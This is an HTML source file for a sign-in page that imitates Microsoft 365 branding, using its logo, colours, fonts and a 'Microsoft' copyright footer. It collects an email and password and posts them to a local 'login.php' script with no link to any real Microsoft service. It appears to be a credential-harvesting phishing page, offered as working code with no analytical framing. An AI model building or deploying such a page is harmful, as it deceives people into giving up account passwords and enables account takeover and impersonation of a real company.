<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        :root {
            --primary: #0078D4;
            --primary-dark: #106EBE;
            --primary-light: #E5F1FB;
            --text-primary: #323130;
            --text-secondary: #605E5C;
            --border: #EDEBE9;
            --error: #A4262C;
            --white: #FFFFFF;
            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.12);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: var(--white);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 20px 0;
            text-align: center;
        }

        .logo {
            height: 24px;
            width: auto;
        }

        .container {
            max-width: 440px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .card {
            background: var(--white);
            border-radius: 8px;
            box-shadow: var(--shadow-md);
            padding: 40px;
            margin-bottom: 20px;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 6px;
            color: var(--text-primary);
        }

        .form-input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid var(--border);
            border-radius: 4px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px var(--primary-light);
        }

        .form-input.error {
            border-color: var(--error);
        }

        .error-message {
            color: var(--error);
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .btn {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-primary {
            background-color: var(--primary);
            color: var(--white);
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
        }

        .links {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        .link {
            color: var(--primary);
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 8px;
            transition: color 0.2s;
        }

        .link:hover {
            color: var(--primary-dark);
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--text-secondary);
        }

        @media (max-width: 480px) {
            .card {
                padding: 24px;
                box-shadow: none;
                border: 1px solid var(--border);
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="m365.png" alt="Microsoft 365" class="logo">
    </header>

    <main class="container">
        <div class="card">
            <h1 class="title">Sign in</h1>
            <form action="login.php" method="POST">
                <div class="form-group">
                    <label for="email" class="form-label">Email, phone, or Skype</label>
                    <input type="text" id="email" name="email" class="form-input" required>
                    <div class="error-message" id="email-error">Please enter a valid email address</div>
                </div>

                <div class="form-group">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" id="password" name="password" class="form-input" required>
                    <div class="error-message" id="password-error">Please enter your password</div>
                </div>

                <div class="form-group">
                    <button type="submit" class="btn btn-primary">Sign in</button>
                </div>
            </form>

            <div class="links">
                <a href="#" class="link">Forgot password?</a>
                <a href="#" class="link">Create account</a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div>Terms of use | Privacy & cookies</div>
        <div>Â© 2023 Microsoft</div>
    </footer>

    <script>
        // Simple form validation
        document.querySelector('form').addEventListener('submit', function(e) {
            let isValid = true;
            const email = document.getElementById('email');
            const password = document.getElementById('password');
            
            // Reset errors
            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));

            // Email validation
            if (!email.value.includes('@')) {
                document.getElementById('email-error').style.display = 'block';
                email.classList.add('error');
                isValid = false;
            }

            // Password validation
            if (password.value.length < 1) {
                document.getElementById('password-error').style.display = 'block';
                password.classList.add('error');
                isValid = false;
            }

            if (!isValid) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
